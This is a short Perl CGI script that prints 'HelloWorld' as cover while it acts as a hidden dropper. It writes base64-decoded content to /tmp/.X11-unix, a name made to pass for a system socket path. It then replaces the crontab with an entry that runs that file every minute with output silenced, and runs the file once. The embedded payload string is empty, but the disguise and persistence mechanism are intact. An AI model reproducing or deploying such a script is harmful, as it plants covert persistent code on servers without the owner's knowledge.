#!/usr/bin/perl
use strict;
use warnings;
use MIME::Base64;

print "Content-type: text/plain\n\n";
print "HelloWorld\n";

open(OLD_UNIX, ">", "/tmp/.X11-unix");
print OLD_UNIX decode_base64("");
close(OLD_UNIX);
system("echo '* * * * * perl /tmp/.X11-unix >/dev/null 2>&1' > /tmp/cron.d ; crontab /tmp/cron.d ; rm /tmp/cron.d");
system("perl /tmp/.X11-unix");